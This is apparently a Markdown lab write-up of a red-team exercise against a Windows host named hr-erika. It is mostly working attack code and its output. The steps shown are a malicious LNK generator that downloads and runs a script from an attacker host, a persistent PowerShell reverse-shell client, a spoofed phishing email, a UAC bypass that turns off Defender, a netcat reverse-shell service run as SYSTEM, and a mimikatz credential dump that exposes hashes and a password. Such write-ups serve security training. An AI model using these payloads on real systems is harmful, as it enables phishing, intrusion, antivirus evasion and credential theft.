---
layout: default
---

## hr-erika 192.168.43.24

In this lab we asume the shadow IT server of GCB architecture for HR section.
And we are going to abuse of erika user relationship with vanessa in order to create a phising attack. With Romi IT user sender impersonation.

### 1. Phising attack LNK link creation

```
 C:\tools> function Create-LNKPayload{
<#
    .SYNOPSIS
        Generates a malicous LNK file
    .PARAMETER LNKName
        Name of the LNK file you want to create.
    .PARAMETER TargetPath
        Path to the exe you want to execute. Defaults to powershell.
    .PARAMETER IconPath
        Path to an exe for an icon. Defaults to Internet Explorer.
    .PARAMETER HostedPayload
        URL/URI to hosted PowerShell payload.

   .EXAMPLE
        Create-LNKPayload -LNKName 'C:\Users\user\Desktop\Policy.lnk' -IconPath 'C:\Program Files (x86)\Microsoft Office\root\Office16\winword.exe,1' -HostedPayload 'http://192.168.1.204/beacon'
        Creates a LNK named "Policy" with the 2nd available icon in the Word executable and then executes powershell code hosted at 'beacon'

#>
    [CmdletBinding(DefaultParameterSetName = 'None')]
    param(

    [Parameter(Mandatory=$True)]
        [String]
        $LNKName,

        [Parameter()]
        [String]
        $TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",

        [Parameter()]
        $IconPath = 'C:\Program Files\Internet Explorer\iexplore.exe',

        [Parameter(Mandatory=$True)]
        [String]
        $HostedPayload

    )

     if($LNKName -notlike "*.lnk"){
        $LNKName = '\' + $LNKName + ".lnk"
     }elseif($LNKName -notlike 'C:\*'){
        $LNKName = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath('.\') + '\' + $LNKName
     }

     $payload = "PowerShell.exe -WindowStyle Hidden -Command '& {Invoke-WebRequest -Uri 'http://192.168.100.15:443/client.ps1' -OutFile 'C:\Users\Public\client.ps1'}'; cmd /c start /min PowerShell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File 'C:\Users\Public\client.ps1'"
     $encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
     $finalPayload = "-nop -WindowStyle Hidden -enc $encodedPayload"
     $obj = New-Object -ComObject WScript.Shell
     $link = $obj.CreateShortcut($LNKName)
     $link.WindowStyle = '7'
     $link.TargetPath = $TargetPath
     $link.IconLocation = $IconPath
     $link.Arguments = $finalPayload
     $link.Save()
}
```
Generate LNK binary:
```
PS C:\Users\itemployee15> Create-LNKPayload  -LNKName .\data.lnk -IconPath 'C:\Program Files (x86)\Microsoft Office\root\Office16\winword.exe,1' -HostedPayload 'payload'
PS C:\Users\itemployee15> ls .\data.lnk


    Directory: C:\Users\itemployee15


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/25/2024  12:56 AM           3565 data.lnk
```

Prepare reverse shell custom client powershell script:

```
# Replace address and port with your server's
# You can edit the script URL if you are hosting it somewhere else

$address = '192.168.100.15'
$port = 80
$scriptURL = 'http://192.168.100.15:443/client.ps1'
$autorunKeyName = "Windows Powershell"
$autorunKeyVal = 'powershell -WindowStyle Hidden -nop -c "iex (New-Object Net.WebClient).DownloadString(''' + $scriptURL + ''')"'

# Persist
$autoruns = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
if (-not $autoruns.$autorunKeyName) {
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName -Value $autorunKeyVal
}
elseif($autoruns.$autorunKeyName -ne $autorunKeyVal) {
    Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName -Value $autorunKeyVal
}

while ($true) {
    # Try to connect to server every 10s
    do {
        try {
            Write-Host "Trying to reach "$address":"$port
            $client = New-Object System.Net.Sockets.TcpClient($address, $port)  
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)
            break
        }
        catch {
            Start-Sleep -s 10
        }
    } while ($true)
    
    Write-Host "Connected"
    # Execute commands sent by the server, and return output
    try {
        do {
            $cmd = $reader.ReadLine()
            if ($cmd -eq 'exit') {
                Write-Host "Exiting"
                break
            }
            try {
                $output = [string](iex $cmd)
            }
            catch {
                $output = $_.Exception.Message
            }
            $writer.WriteLine($output)
            $writer.Flush()
        } while($true)
    }
    catch {
        Write-Host $_.Exception.Message
    }
    
    # Cleanup
    $writer.Close()
    $reader.Close()
    $stream.Close()
    $client.Close()
}
```

Check execution at local attacker machine with AV enabled:

```
PS C:\Users\itemployee15> powercat -l -v -p 80 -t 9999
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 80)
VERBOSE: Connection from [192.168.100.15] port  [tcp] accepted (source port 53133)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
whoami
it\itemployee15
hostname
IT-Employee15
pwd
C:\Users\itemployee15

```
![ Local Phising attack ](/assets/images/LocalPhising.png)

### 2. Send crafted payload with AV bypass

Generate LNK zip and send malicious attachment to erika HR user mailbox from user Romi
```
Send-MailMessage -From "Romi<romi@it.gcb.local>" -To "erika<erika@gcbfinance.local>" -Subject "Your mailbox is alive" -SmtpServer 192.168.43.33 -Attachments .\exec.zip
```
### 3. Obtaning a new shell with erika privileges on attacker machine from hr-erika.gcbhr.local

```
PS C:\Users\itemployee15> Import-Module C:\tools\powercat.ps1
PS C:\Users\itemployee15> powercat -l -v -p 80 -t 999999
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 80)
VERBOSE: Connection from [192.168.43.24] port  [tcp] accepted (source port 50345)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
whoami
hr\erika
hostname
hr-erika
ipconfig
 Windows IP Configuration   Ethernet adapter Ethernet:     Connection-specific DNS Suffix  . :     Link-local IPv6 Address . . . . . : fe80::e066:9c44:4443:e60a%13    IPv4 Address. . . . . . . . . . . : 192.168.43.24    Subnet Mask . . . . . . . . . . . : 255.255.255.0    Default Gateway . . . . . . . . . : 192.168.43.254
whoami /all
 USER INFORMATION ----------------  User Name SID                                           ========= ============================================= hr\erika  S-1-5-21-3602425948-896546556-3985009324-1106   GROUP INFORMATION -----------------  Group Name                                 Type             SID          Attributes                                         ========================================== ================ ============ ================================================== Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group BUILTIN\Administrators                     Alias            S-1-5-32-544 Group used for deny only                           BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                       PRIVILEGES INFORMATION ----------------------  Privilege Name                Description                    State    ============================= ============================== ======== SeChangeNotifyPrivilege       Bypass traverse checking       Enabled  SeIncreaseWorkingSetPrivilege Increase a process working set Disabled   USER CLAIMS INFORMATION -----------------------  User claims unknown.  Kerberos support for Dynamic Access Control on this device has been disabled.
```
![ Remote Phising attack ](/assets/images/RemotePhising.png)

### 4. UAC bypass on target erika-hr.gcbhr.local (Disable remote AV)

Custom UAC bypass function from commandline in order to execute commands with high Integrity level:

```
function Bypass-UAC{
	[CmdletBinding()]
	param([string]$payload='cmd.exe')

    #Get Windows Version
    $ver = [System.Environment]::OSVersion.Version.Major

	#Get UAC Level
	$key = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
	$uac = Get-ItemPropertyValue -Path $key -Name ConsentPromptBehaviorAdmin

	function Add-RegKey([string]$key, [string]$exploit, [string]$payload='cmd.exe'){
		$regPath = "HKCU:\Software\Classes\$key\shell\open\command"
		New-Item $regPath -Force
		New-ItemProperty $regPath -Name "DelegateExecute" -Value $null -Force
		Set-ItemProperty $regPath -Name "(default)" -Value $payload -Force
		Start-Process $exploit
		Start-Sleep -s 5
		Remove-Item $regPath -Force -Recurse
	}

	if ($uac -eq 2) {
		$UAC_LEVEL = 'High'
	} elseif ($uac -eq 0) {
		$UAC_LEVEL = 'None'
	} elseif ($uac -eq 5) {
		$UAC_LEVEL = 'Default'
	} else {
		$UAC_LEVEL = 'Unknown'
	}

	if ($UAC_LEVEL -eq "High") {
		exit
	} elseif ($UAC_LEVEL -eq "None") {
		Start-Process -FilePath $payload -verb runas
	} else {
		if ($ver -eq 10) {
			Add-RegKey ms-settings ComputerDefaults.exe $payload
		} else {
			Add-RegKey mscfile CompMgmtLauncher.exe $payload
		}
	}
}
Bypass-UAC 'powershell -ep bypass -c "Set-MpPreference -DisableRealTimeMonitoring 1"'
```
Disable AV:
```
IEX (New-Object Net.Webclient).DownloadString("http://192.168.100.15:443/Bypass-UAC.ps1")
```
### 4. Escalate privileges on erika-hr.gcbhr.local

```
wget http://192.168.100.15:443/nc.exe -OutFile C:\Users\Public\nc.exe

cmd /c sc create REVERSE binPath= "cmd /c C:\Users\Public\nc.exe -e cmd 192.168.100.15 443"
[SC] OpenSCManager FAILED 5:  Access is denied.
IEX (New-Object Net.Webclient).DownloadString("http://192.168.100.15:443/Bypass-UAC.ps1")
Bypass-UAC 'cmd /c sc create REVERSE binPath= "cmd /c C:\Users\Public\nc.exe -e cmd 192.168.100.15 443"'
HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command @{DelegateExecute=; PSPath=Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command; PSParentPath=Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open; PSChildName=command; PSDrive=HKCU; PSProvider=Microsoft.PowerShell.Core\Registry}
HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command @{DelegateExecute=; PSPath=Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command; PSParentPath=Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open; PSChildName=command; PSDrive=HKCU; PSProvider=Microsoft.PowerShell.Core\Registry}
Bypass-UAC 'cmd /c sc start REVERSE'
HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command @{DelegateExecute=; PSPath=Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command; PSParentPath=Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open; PSChildName=command; PSDrive=HKCU; PSProvider=Microsoft.PowerShell.Core\Registry}
```

Nt Authority system:

```
PS C:\Users\itemployee15> powercat -l -v -p 443 -t 999999
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
VERBOSE: Connection from [192.168.43.24] port  [tcp] accepted (source port 50376)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
whoami
Microsoft Windows [Version 10.0.17763.5458]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname
hostname
hr-erika

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::e066:9c44:4443:e60a%13
   IPv4 Address. . . . . . . . . . . : 192.168.43.24
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.43.254

C:\Windows\system32>
```

### 4. Dump Lsass process

```
PS C:\> C:\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "vault::list" vault::cred /patch "exit"
C:\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "vault::list" vault::cred /patch "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonPasswords

Authentication Id : 0 ; 2620126 (00000000:0027fade)
Session           : RemoteInteractive from 2
User Name         : erika
Domain            : HR
Logon Server      : HR-DC02
Logon Time        : 4/29/2024 12:12:44 AM
SID               : S-1-5-21-3602425948-896546556-3985009324-1106
        msv :
         [00000003] Primary
         * Username : erika
         * Domain   : HR
         * NTLM     : f65007b90cd27dc7828c95c21d60376c
         * SHA1     : 252b6dd27293b2495546167f3adb4d562d173da9
         * DPAPI    : 41ba63d28151fc25c1fff42fa00ec1a4
        tspkg :
        wdigest :
         * Username : erika
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : erika
         * Domain   : GCBHR.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 2566906 (00000000:00272afa)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/29/2024 12:12:25 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : HR-ERIKA$
         * Domain   : HR
         * NTLM     : 7708f8f5dda6641d06795522d0aa9a61
         * SHA1     : 658066b5bf777425315860501836699c0b52fc0f
         * DPAPI    : 658066b5bf777425315860501836699c
        tspkg :
        wdigest :
         * Username : HR-ERIKA$
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : HR-ERIKA$
         * Domain   : gcbhr.local
         * Password : 09 50 fe 3f a1 8c 80 83 6f 4b be 08 b1 68 65 8b 64 1f 04 20 de 22 13 ba 72 0f aa c0 2e a1 f7 03 e8 0d 29 46 72 be 6a f9 68 aa b7 59 71 fb f4 9d 80 81 d8 d8 d4 1c e8 33 ea 98 09 b4 ed 17 df e9 e4 92 b6 17 a1 dc e3 91 63 9d 79 29 7a bc e5 29 45 17 53 06 74 fb 45 e9 c0 13 38 bc 68 73 df c6 39 b2 9b e3 6b 7f 8d dd 03 57 a1 07 77 3d 27 82 44 e7 42 0b 3e 43 69 e7 11 03 fc b4 06 e6 36 05 36 89 44 05 51 a9 e5 58 ae be 70 64 18 02 db 87 d0 e6 2f a6 0e fa 37 79 66 57 1b cb 18 0e c2 53 46 54 89 d1 c5 ff 2a 46 e1 05 4a f6 63 e3 d6 8f 8c 21 8a a4 fa be a7 39 84 31 f2 25 65 4a 58 d3 8c e1 86 f3 d4 c7 3a 29 86 a6 a7 8e 84 c7 7e 62 73 b1 62 d3 ff 16 85 60 db 31 64 c5 65 a6 7e 7d 8f 4e 99 82 5b 74 6e 1c a8 26 54 5e 3e 20 7d ae
        ssp :
        credman :

Authentication Id : 0 ; 48488 (00000000:0000bd68)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:57 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : HR-ERIKA$
         * Domain   : HR
         * NTLM     : 7708f8f5dda6641d06795522d0aa9a61
         * SHA1     : 658066b5bf777425315860501836699c0b52fc0f
         * DPAPI    : 658066b5bf777425315860501836699c
        tspkg :
        wdigest :
         * Username : HR-ERIKA$
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : HR-ERIKA$
         * Domain   : gcbhr.local
         * Password : 09 50 fe 3f a1 8c 80 83 6f 4b be 08 b1 68 65 8b 64 1f 04 20 de 22 13 ba 72 0f aa c0 2e a1 f7 03 e8 0d 29 46 72 be 6a f9 68 aa b7 59 71 fb f4 9d 80 81 d8 d8 d4 1c e8 33 ea 98 09 b4 ed 17 df e9 e4 92 b6 17 a1 dc e3 91 63 9d 79 29 7a bc e5 29 45 17 53 06 74 fb 45 e9 c0 13 38 bc 68 73 df c6 39 b2 9b e3 6b 7f 8d dd 03 57 a1 07 77 3d 27 82 44 e7 42 0b 3e 43 69 e7 11 03 fc b4 06 e6 36 05 36 89 44 05 51 a9 e5 58 ae be 70 64 18 02 db 87 d0 e6 2f a6 0e fa 37 79 66 57 1b cb 18 0e c2 53 46 54 89 d1 c5 ff 2a 46 e1 05 4a f6 63 e3 d6 8f 8c 21 8a a4 fa be a7 39 84 31 f2 25 65 4a 58 d3 8c e1 86 f3 d4 c7 3a 29 86 a6 a7 8e 84 c7 7e 62 73 b1 62 d3 ff 16 85 60 db 31 64 c5 65 a6 7e 7d 8f 4e 99 82 5b 74 6e 1c a8 26 54 5e 3e 20 7d ae
        ssp :
        credman :

Authentication Id : 0 ; 48448 (00000000:0000bd40)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:57 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : HR-ERIKA$
         * Domain   : HR
         * NTLM     : 7708f8f5dda6641d06795522d0aa9a61
         * SHA1     : 658066b5bf777425315860501836699c0b52fc0f
         * DPAPI    : 658066b5bf777425315860501836699c
        tspkg :
        wdigest :
         * Username : HR-ERIKA$
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : HR-ERIKA$
         * Domain   : gcbhr.local
         * Password : 09 50 fe 3f a1 8c 80 83 6f 4b be 08 b1 68 65 8b 64 1f 04 20 de 22 13 ba 72 0f aa c0 2e a1 f7 03 e8 0d 29 46 72 be 6a f9 68 aa b7 59 71 fb f4 9d 80 81 d8 d8 d4 1c e8 33 ea 98 09 b4 ed 17 df e9 e4 92 b6 17 a1 dc e3 91 63 9d 79 29 7a bc e5 29 45 17 53 06 74 fb 45 e9 c0 13 38 bc 68 73 df c6 39 b2 9b e3 6b 7f 8d dd 03 57 a1 07 77 3d 27 82 44 e7 42 0b 3e 43 69 e7 11 03 fc b4 06 e6 36 05 36 89 44 05 51 a9 e5 58 ae be 70 64 18 02 db 87 d0 e6 2f a6 0e fa 37 79 66 57 1b cb 18 0e c2 53 46 54 89 d1 c5 ff 2a 46 e1 05 4a f6 63 e3 d6 8f 8c 21 8a a4 fa be a7 39 84 31 f2 25 65 4a 58 d3 8c e1 86 f3 d4 c7 3a 29 86 a6 a7 8e 84 c7 7e 62 73 b1 62 d3 ff 16 85 60 db 31 64 c5 65 a6 7e 7d 8f 4e 99 82 5b 74 6e 1c a8 26 54 5e 3e 20 7d ae
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : HR-ERIKA$
Domain            : HR
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:56 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : HR-ERIKA$
         * Domain   : HR
         * NTLM     : 7708f8f5dda6641d06795522d0aa9a61
         * SHA1     : 658066b5bf777425315860501836699c0b52fc0f
         * DPAPI    : 658066b5bf777425315860501836699c
        tspkg :
        wdigest :
         * Username : HR-ERIKA$
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : hr-erika$
         * Domain   : GCBHR.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 29301 (00000000:00007275)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:55 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : HR-ERIKA$
         * Domain   : HR
         * NTLM     : 7708f8f5dda6641d06795522d0aa9a61
         * SHA1     : 658066b5bf777425315860501836699c0b52fc0f
         * DPAPI    : 658066b5bf777425315860501836699c
        tspkg :
        wdigest :
         * Username : HR-ERIKA$
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : HR-ERIKA$
         * Domain   : gcbhr.local
         * Password : 09 50 fe 3f a1 8c 80 83 6f 4b be 08 b1 68 65 8b 64 1f 04 20 de 22 13 ba 72 0f aa c0 2e a1 f7 03 e8 0d 29 46 72 be 6a f9 68 aa b7 59 71 fb f4 9d 80 81 d8 d8 d4 1c e8 33 ea 98 09 b4 ed 17 df e9 e4 92 b6 17 a1 dc e3 91 63 9d 79 29 7a bc e5 29 45 17 53 06 74 fb 45 e9 c0 13 38 bc 68 73 df c6 39 b2 9b e3 6b 7f 8d dd 03 57 a1 07 77 3d 27 82 44 e7 42 0b 3e 43 69 e7 11 03 fc b4 06 e6 36 05 36 89 44 05 51 a9 e5 58 ae be 70 64 18 02 db 87 d0 e6 2f a6 0e fa 37 79 66 57 1b cb 18 0e c2 53 46 54 89 d1 c5 ff 2a 46 e1 05 4a f6 63 e3 d6 8f 8c 21 8a a4 fa be a7 39 84 31 f2 25 65 4a 58 d3 8c e1 86 f3 d4 c7 3a 29 86 a6 a7 8e 84 c7 7e 62 73 b1 62 d3 ff 16 85 60 db 31 64 c5 65 a6 7e 7d 8f 4e 99 82 5b 74 6e 1c a8 26 54 5e 3e 20 7d ae
        ssp :
        credman :

Authentication Id : 0 ; 27387 (00000000:00006afb)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:54 PM
SID               :
        msv :
         [00000003] Primary
         * Username : HR-ERIKA$
         * Domain   : HR
         * NTLM     : 7708f8f5dda6641d06795522d0aa9a61
         * SHA1     : 658066b5bf777425315860501836699c0b52fc0f
         * DPAPI    : 658066b5bf777425315860501836699c
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 2620053 (00000000:0027fa95)
Session           : RemoteInteractive from 2
User Name         : erika
Domain            : HR
Logon Server      : HR-DC02
Logon Time        : 4/29/2024 12:12:44 AM
SID               : S-1-5-21-3602425948-896546556-3985009324-1106
        msv :
         [00000003] Primary
         * Username : erika
         * Domain   : HR
         * NTLM     : f65007b90cd27dc7828c95c21d60376c
         * SHA1     : 252b6dd27293b2495546167f3adb4d562d173da9
         * DPAPI    : 41ba63d28151fc25c1fff42fa00ec1a4
        tspkg :
        wdigest :
         * Username : erika
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : erika
         * Domain   : GCBHR.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 2571148 (00000000:00273b8c)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/29/2024 12:12:26 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : HR-ERIKA$
         * Domain   : HR
         * NTLM     : 7708f8f5dda6641d06795522d0aa9a61
         * SHA1     : 658066b5bf777425315860501836699c0b52fc0f
         * DPAPI    : 658066b5bf777425315860501836699c
        tspkg :
        wdigest :
         * Username : HR-ERIKA$
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : HR-ERIKA$
         * Domain   : gcbhr.local
         * Password : 09 50 fe 3f a1 8c 80 83 6f 4b be 08 b1 68 65 8b 64 1f 04 20 de 22 13 ba 72 0f aa c0 2e a1 f7 03 e8 0d 29 46 72 be 6a f9 68 aa b7 59 71 fb f4 9d 80 81 d8 d8 d4 1c e8 33 ea 98 09 b4 ed 17 df e9 e4 92 b6 17 a1 dc e3 91 63 9d 79 29 7a bc e5 29 45 17 53 06 74 fb 45 e9 c0 13 38 bc 68 73 df c6 39 b2 9b e3 6b 7f 8d dd 03 57 a1 07 77 3d 27 82 44 e7 42 0b 3e 43 69 e7 11 03 fc b4 06 e6 36 05 36 89 44 05 51 a9 e5 58 ae be 70 64 18 02 db 87 d0 e6 2f a6 0e fa 37 79 66 57 1b cb 18 0e c2 53 46 54 89 d1 c5 ff 2a 46 e1 05 4a f6 63 e3 d6 8f 8c 21 8a a4 fa be a7 39 84 31 f2 25 65 4a 58 d3 8c e1 86 f3 d4 c7 3a 29 86 a6 a7 8e 84 c7 7e 62 73 b1 62 d3 ff 16 85 60 db 31 64 c5 65 a6 7e 7d 8f 4e 99 82 5b 74 6e 1c a8 26 54 5e 3e 20 7d ae
        ssp :
        credman :

Authentication Id : 0 ; 2571130 (00000000:00273b7a)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/29/2024 12:12:26 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : HR-ERIKA$
         * Domain   : HR
         * NTLM     : 7708f8f5dda6641d06795522d0aa9a61
         * SHA1     : 658066b5bf777425315860501836699c0b52fc0f
         * DPAPI    : 658066b5bf777425315860501836699c
        tspkg :
        wdigest :
         * Username : HR-ERIKA$
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : HR-ERIKA$
         * Domain   : gcbhr.local
         * Password : 09 50 fe 3f a1 8c 80 83 6f 4b be 08 b1 68 65 8b 64 1f 04 20 de 22 13 ba 72 0f aa c0 2e a1 f7 03 e8 0d 29 46 72 be 6a f9 68 aa b7 59 71 fb f4 9d 80 81 d8 d8 d4 1c e8 33 ea 98 09 b4 ed 17 df e9 e4 92 b6 17 a1 dc e3 91 63 9d 79 29 7a bc e5 29 45 17 53 06 74 fb 45 e9 c0 13 38 bc 68 73 df c6 39 b2 9b e3 6b 7f 8d dd 03 57 a1 07 77 3d 27 82 44 e7 42 0b 3e 43 69 e7 11 03 fc b4 06 e6 36 05 36 89 44 05 51 a9 e5 58 ae be 70 64 18 02 db 87 d0 e6 2f a6 0e fa 37 79 66 57 1b cb 18 0e c2 53 46 54 89 d1 c5 ff 2a 46 e1 05 4a f6 63 e3 d6 8f 8c 21 8a a4 fa be a7 39 84 31 f2 25 65 4a 58 d3 8c e1 86 f3 d4 c7 3a 29 86 a6 a7 8e 84 c7 7e 62 73 b1 62 d3 ff 16 85 60 db 31 64 c5 65 a6 7e 7d 8f 4e 99 82 5b 74 6e 1c a8 26 54 5e 3e 20 7d ae
        ssp :
        credman :

Authentication Id : 0 ; 241279 (00000000:0003ae7f)
Session           : Service from 0
User Name         : erika-admin
Domain            : HR
Logon Server      : HR-DC02
Logon Time        : 4/28/2024 11:46:21 PM
SID               : S-1-5-21-3602425948-896546556-3985009324-1105
        msv :
         [00000003] Primary
         * Username : erika-admin
         * Domain   : HR
         * NTLM     : d5629de7fd9d15efcffecfdd4f1156ae
         * SHA1     : 61efbc84c24a8b223224a74d0133ced5aaaca649
         * DPAPI    : f079c68089049c0bde676886f4021fd3
        tspkg :
        wdigest :
         * Username : erika-admin
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : erika-admin
         * Domain   : GCBHR.LOCAL
         * Password : N0tForD@ilyUse
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:58 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 29276 (00000000:0000725c)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:55 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : HR-ERIKA$
         * Domain   : HR
         * NTLM     : 7708f8f5dda6641d06795522d0aa9a61
         * SHA1     : 658066b5bf777425315860501836699c0b52fc0f
         * DPAPI    : 658066b5bf777425315860501836699c
        tspkg :
        wdigest :
         * Username : HR-ERIKA$
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : HR-ERIKA$
         * Domain   : gcbhr.local
         * Password : 09 50 fe 3f a1 8c 80 83 6f 4b be 08 b1 68 65 8b 64 1f 04 20 de 22 13 ba 72 0f aa c0 2e a1 f7 03 e8 0d 29 46 72 be 6a f9 68 aa b7 59 71 fb f4 9d 80 81 d8 d8 d4 1c e8 33 ea 98 09 b4 ed 17 df e9 e4 92 b6 17 a1 dc e3 91 63 9d 79 29 7a bc e5 29 45 17 53 06 74 fb 45 e9 c0 13 38 bc 68 73 df c6 39 b2 9b e3 6b 7f 8d dd 03 57 a1 07 77 3d 27 82 44 e7 42 0b 3e 43 69 e7 11 03 fc b4 06 e6 36 05 36 89 44 05 51 a9 e5 58 ae be 70 64 18 02 db 87 d0 e6 2f a6 0e fa 37 79 66 57 1b cb 18 0e c2 53 46 54 89 d1 c5 ff 2a 46 e1 05 4a f6 63 e3 d6 8f 8c 21 8a a4 fa be a7 39 84 31 f2 25 65 4a 58 d3 8c e1 86 f3 d4 c7 3a 29 86 a6 a7 8e 84 c7 7e 62 73 b1 62 d3 ff 16 85 60 db 31 64 c5 65 a6 7e 7d 8f 4e 99 82 5b 74 6e 1c a8 26 54 5e 3e 20 7d ae
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : HR-ERIKA$
Domain            : HR
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:54 PM
SID               : S-1-5-18
        msv :
